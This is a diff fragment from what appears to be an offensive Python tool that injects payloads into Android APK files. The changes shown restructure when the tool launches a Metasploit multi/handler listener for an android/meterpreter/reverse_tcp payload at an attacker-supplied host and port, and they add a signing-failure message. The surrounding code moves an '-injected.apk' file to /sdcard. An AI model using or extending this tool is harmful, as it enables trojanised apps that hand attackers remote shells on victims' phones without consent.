@@ -217,14 +217,16 @@ def embed():
                 if os.path.isfile("port"):
                     host = open("host").readline().strip()
                     port = open("port").readline().strip()
-                    pass
+                    dog = str(input("do you want to start listener? (y/n) "))
+                    if dog == "y" or dog == "Y":
+                        os.system('msfconsole -x "use multi/handler;set payload android/meterpreter/reverse_tcp;set lhost '+host+';set lport '+port+';show options"')
+                    else:
+                        sys.exit(1)
                 else:
                     os.system("rm -rf payload payload.apk &> /dev//null")
-            dog = str(input("do you want to start listener? (y/n) "))
-            if dog == "y" or dog == "Y":
-                os.system('msfconsole -x "use multi/handler;set payload android/meterpreter/reverse_tcp;set lhost '+host+';set lport '+port+';show options"')
+                    pass
             else:
-                sys.exit(1)
+                pass
         else:
             out = "/sdcard"
             os.system("mv "+a3+"-injected.apk /sdcard")
@@ -240,6 +242,7 @@ def embed():
         dog = str(input(w+"[ enter ]"))
         sys.exit(1)
     else:
+        print(r+"[!]"+w+" failed to sign apk file")
         sys.exit(1)
 
 def menulist():
